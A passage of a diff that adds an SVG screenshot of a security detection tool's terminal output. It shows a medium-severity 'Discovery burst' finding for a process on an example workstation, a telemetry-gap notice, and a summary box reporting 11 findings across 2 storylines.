+</text><text class="terminal-2458574024-r8" x="24.4" y="1874.4" textLength="73.2" clip-path="url(#terminal-2458574024-line-76)">MEDIUM</text><text class="terminal-2458574024-r2" x="158.6" y="1874.4" textLength="85.4" clip-path="url(#terminal-2458574024-line-76)">GR-002&#160;</text><text class="terminal-2458574024-r2" x="280.6" y="1874.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-76)">Discovery&#160;burst&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="536.8" y="1874.4" textLength="170.8" clip-path="url(#terminal-2458574024-line-76)">upd.exe&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="744.2" y="1874.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-76)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1000.4" y="1874.4" textLength="244" clip-path="url(#terminal-2458574024-line-76)">2026-10-12T11:00:10Z</text><text class="terminal-2458574024-r2" x="1281" y="1874.4" textLength="61" clip-path="url(#terminal-2458574024-line-76)">&#160;&#160;&#160;&#160;3</text><text class="terminal-2458574024-r2" x="1378.6" y="1874.4" textLength="61" clip-path="url(#terminal-2458574024-line-76)">S2&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1874.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-76)">
+</text><text class="terminal-2458574024-r2" x="1464" y="1898.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-77)">
+</text><text class="terminal-2458574024-r4" x="12.2" y="1923.2" textLength="170.8" clip-path="url(#terminal-2458574024-line-78)">Telemetry&#160;gaps</text><text class="terminal-2458574024-r3" x="195.2" y="1923.2" textLength="183" clip-path="url(#terminal-2458574024-line-78)">(informational)</text><text class="terminal-2458574024-r2" x="1464" y="1923.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-78)">
+</text><text class="terminal-2458574024-r2" x="0" y="1947.6" textLength="1085.8" clip-path="url(#terminal-2458574024-line-79)">&#160;&#160;&#160;ws-14.corp.example&#160;2026-10-12T10:02:55Z&#160;→&#160;2026-10-12T11:00:00Z&#160;(57&#160;min&#160;with&#160;no&#160;events)</text><text class="terminal-2458574024-r2" x="1464" y="1947.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-79)">
+</text><text class="terminal-2458574024-r2" x="0" y="1972" textLength="24.4" clip-path="url(#terminal-2458574024-line-80)">╭─</text><text class="terminal-2458574024-r2" x="24.4" y="1972" textLength="1415.2" clip-path="url(#terminal-2458574024-line-80)">&#160;Result&#160;────────────────────────────────────────────────────────────────────────────────────────────────────────────</text><text class="terminal-2458574024-r2" x="1439.6" y="1972" textLength="24.4" clip-path="url(#terminal-2458574024-line-80)">─╮</text><text class="terminal-2458574024-r2" x="1464" y="1972" textLength="12.2" clip-path="url(#terminal-2458574024-line-80)">
+</text><text class="terminal-2458574024-r2" x="0" y="1996.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-81)">│</text><text class="terminal-2458574024-r10" x="24.4" y="1996.4" textLength="207.4" clip-path="url(#terminal-2458574024-line-81)">FINDINGS&#160;DETECTED</text><text class="terminal-2458574024-r2" x="231.8" y="1996.4" textLength="597.8" clip-path="url(#terminal-2458574024-line-81)">&#160;&#160;&#160;2&#160;storylines&#160;·&#160;11&#160;findings&#160;·&#160;coverage&#160;complete</text><text class="terminal-2458574024-r2" x="1451.8" y="1996.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-81)">│</text><text class="terminal-2458574024-r2" x="1464" y="1996.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-81)">
+</text><text class="terminal-2458574024-r2" x="0" y="2020.8" textLength="24.4" clip-path="url(#terminal-2458574024-line-82)">╰─</text><text class="terminal-2458574024-r2" x="24.4" y="2020.8" textLength="1415.2" clip-path="url(#terminal-2458574024-line-82)">────────────────────────────────────────────────────────────────────────────────────────────────────────────&#160;exit&#160;1&#160;</text><text class="terminal-2458574024-r2" x="1439.6" y="2020.8" textLength="24.4" clip-path="url(#terminal-2458574024-line-82)">─╯</text><text class="terminal-2458574024-r2" x="1464" y="2020.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-82)">
+</text>
+    </g>
+    </g>
+</svg>
